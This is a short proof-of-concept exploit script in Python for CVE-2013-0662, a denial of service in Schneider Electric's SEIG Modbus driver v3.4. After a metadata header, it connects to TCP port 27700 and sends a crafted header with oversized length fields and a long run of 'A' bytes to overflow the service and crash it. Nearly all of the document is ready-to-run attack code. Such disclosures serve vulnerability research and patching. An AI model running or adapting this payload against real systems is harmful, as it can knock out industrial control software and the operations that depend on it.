# Title: SEIG Modbus 3.4 - Denial of Service (PoC)
# Author: Alejandro Parodi
# Date: 2018-08-17
# Vendor Homepage: https://www.schneider-electric.com
# Software Link: https://github.com/hdbreaker/Ricnar-Exploit-Solutions/tree/master/Medium/CVE-2013-0662-SEIG-Modbus-Driver-v3.34/VERSION%203.4
# Version: v3.4
# Tested on: Windows7 x86
# CVE: CVE-2013-0662
# References:
# https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-0662

import socket
import struct
import time

ip = "192.168.245.135"
port = 27700
con = (ip, port)

header_padding = "\x00\xAA"
header_buffer_size = "\xFF\xFF"
header_recv_len = "\x08\xDD"  # (header_buffer_size + 1 en el ultimo byte por que se le resta uno)
header_end = "\xFF"

header = header_padding + header_buffer_size + header_recv_len + header_end
message = "\x00\x64" + "A" * 2267

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(con)
s.send(header)
s.send(message)
